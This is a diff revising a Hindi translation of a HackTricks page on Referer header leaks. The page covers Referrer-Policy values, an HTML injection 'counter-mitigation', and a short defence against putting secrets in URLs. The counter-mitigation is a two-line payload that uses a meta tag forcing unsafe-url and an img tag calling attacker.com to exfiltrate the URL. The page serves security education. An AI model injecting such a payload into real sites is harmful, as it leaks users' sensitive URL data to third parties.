@@ -1,16 +1,18 @@
+# Interesting HTTP
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+## Referrer headers और policy
 
-Referrer वह हेडर है जिसका उपयोग ब्राउज़रों द्वारा यह संकेत करने के लिए किया जाता है कि कौन सा पिछला पृष्ठ देखा गया था।
+Referrer वह header है जिसका उपयोग browsers यह बताने के लिए करते हैं कि पिछला visit किया गया page कौन-सा था।
 
-## संवेदनशील जानकारी लीक
+### Sensitive information leak
 
-यदि किसी समय एक वेब पृष्ठ के अंदर कोई संवेदनशील जानकारी GET अनुरोध पैरामीटर पर स्थित है, यदि पृष्ठ में बाहरी स्रोतों के लिए लिंक हैं या एक हमलावर उपयोगकर्ता को एक URL पर जाने के लिए मजबूर/सुझाव देने में सक्षम है जो हमलावर द्वारा नियंत्रित है। यह नवीनतम GET अनुरोध के अंदर संवेदनशील जानकारी को निकालने में सक्षम हो सकता है।
+यदि किसी web page के अंदर किसी बिंदु पर GET request parameters में कोई sensitive information मौजूद है, और page में external sources के links हैं या attacker user को attacker द्वारा नियंत्रित URL पर visit करने के लिए प्रेरित/सुझाव देने (social engineering) में सक्षम है, तो latest GET request के अंदर मौजूद sensitive information को exfiltrate किया जा सकता है।
 
-## शमन
+### Mitigation
 
-आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो संवेदनशील जानकारी को अन्य वेब अनुप्रयोगों में भेजने से **बचा** सकता है:
+आप browser को एक **Referrer-policy** follow करने के लिए configure कर सकते हैं, जो **sensitive information** को अन्य web applications पर भेजे जाने से **रोक सकती है**:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Counter-Mitigation
+### Counter-Mitigation
 
-आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का लाभ उठाने की आवश्यकता है):
+आप इस नियम को एक HTML meta tag का उपयोग करके override कर सकते हैं (attacker को HTML injection exploit करना होगा):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
-## Defense
+## रक्षा
 
-कभी भी किसी संवेदनशील डेटा को GET पैरामीटर या URL में पथ के अंदर न रखें।
+URL में GET parameters या paths के अंदर कभी भी कोई sensitive data न रखें।
 
 {{#include ../banners/hacktricks-training.md}}
